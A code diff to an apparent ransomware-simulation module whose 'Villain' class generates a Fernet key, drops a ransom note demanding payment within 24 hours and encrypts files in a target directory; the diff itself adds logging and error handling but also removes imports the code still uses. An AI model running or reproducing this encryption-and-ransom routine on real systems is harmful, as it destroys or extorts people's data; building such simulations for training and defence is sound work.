@@ -1,10 +1,6 @@
-import os
-from cryptography.fernet import Fernet
-from pathlib import Path
-from .safety import SafetyEnforcer
-from .analyst import Analyst
-from .config import Config
-import time
+from .logger import setup_logger
+
+logger = setup_logger(__name__)
 
 class Villain:
     """
@@ -15,10 +11,15 @@ class Villain:
     @staticmethod
     def generate_key() -> None:
         """Generates and saves a new Fernet encryption key if one does not exist."""
-        if not Config.KEY_FILE.exists():
-            key = Fernet.generate_key()
-            with open(Config.KEY_FILE, "wb") as key_file:
-                key_file.write(key)
+        try:
+            if not Config.KEY_FILE.exists():
+                key = Fernet.generate_key()
+                with open(Config.KEY_FILE, "wb") as key_file:
+                    key_file.write(key)
+                logger.info("Generated new encryption key.")
+        except Exception as e:
+            logger.error(f"Failed to generate key: {e}")
+            raise
 
     @staticmethod
     def load_key() -> bytes:
@@ -47,6 +48,7 @@ class Villain:
         
         # Generate a unique Incident ID for this attack
         incident_id = f"INC-{int(time.time())}"
+        logger.info(f"Initiating Attack Simulation. Incident ID: {incident_id}")
         Analyst.log_event("Attack Start", incident_id=incident_id)
         
         key = Villain.load_key()
@@ -56,9 +58,10 @@ class Villain:
         encrypted_count = 0
         
         # Drop Ransom Note
-        ransom_note_path = target_dir / Config.RANSOM_NOTE_FILE
-        with open(ransom_note_path, "w") as f:
-            f.write(f"""
+        try:
+            ransom_note_path = target_dir / Config.RANSOM_NOTE_FILE
+            with open(ransom_note_path, "w") as f:
+                f.write(f"""
 !!! YOUR FILES HAVE BEEN ENCRYPTED !!!
 Incident ID: {incident_id}
 
@@ -70,7 +73,9 @@ To purchase the decryption key:
 2. Email us at ransomware@darkweb.local with your Incident ID.
 
 Time is ticking. If you do not pay within 24 hours, your data will be lost forever.
-            """)
+                """)
+        except Exception as e:
+            logger.error(f"Failed to drop ransom note: {e}")
         
         # Walk through the directory
         files_to_encrypt = []
@@ -108,8 +113,9 @@ Time is ticking. If you do not pay within 24 hours, your data will be lost forev
                 time.sleep(0.05) 
                 
             except Exception as e:
-                print(f"Failed to encrypt {file_path.name}: {e}")
+                logger.error(f"Failed to encrypt {file_path.name}: {e}")
         
+        logger.info(f"Attack Complete. {encrypted_count} files encrypted.")
         Analyst.log_event("Encryption Complete", {"files_encrypted": encrypted_count}, incident_id=incident_id)
         return encrypted_count, incident_id
         
